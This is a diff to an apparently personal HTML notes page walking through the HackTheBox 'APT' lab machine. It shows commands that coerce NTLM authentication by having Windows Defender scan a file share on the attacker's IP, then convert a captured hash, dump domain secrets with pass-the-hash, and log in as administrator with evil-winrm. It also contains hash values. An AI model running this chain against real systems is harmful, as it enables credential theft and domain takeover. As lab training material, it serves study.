@@ -1903,11 +1903,10 @@
                         <br>*Evil-WinRM* PS C:\Program Files\windows defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.9\share\file.txt
                         <br>note: -ScanType 1:quick scan, 2:full scan, 3:specify file
                         <br>OR Collect Net-NTLMv1 hash Via RPC / RoguePotato [ippsec_video][0xdf_post]
-                        <br>APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
                         <br>`python3 ~/tool/ntlmv1-multi-master/ntlmv1.py --ntlmv1 APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788`
                         <br>script output: "To Crack with crack.sh use the following token   NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384"
                         <br>everybody's walkthrough using https://crack.sh/get-cracking/ to crack, and receive email within 1 min. but now that site/page showing "down for maintenance"
-                        <br>which is why I never actually cracked the NTLMv1 Hash, have copy from others: d167c3238864b12f5f82feae86a7f798
+                        <br>which is why I never actually cracked the NTLMv1 Hash, have to copy from others: d167c3238864b12f5f82feae86a7f798
                         <br>`secretsdump.py -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@htb.local'` got administrator NTLM
                         <br>`evil-winrm -u administrator -H c370bddf384a691d811ff3495e8a72e2 -i apt.htb`
                     </div>
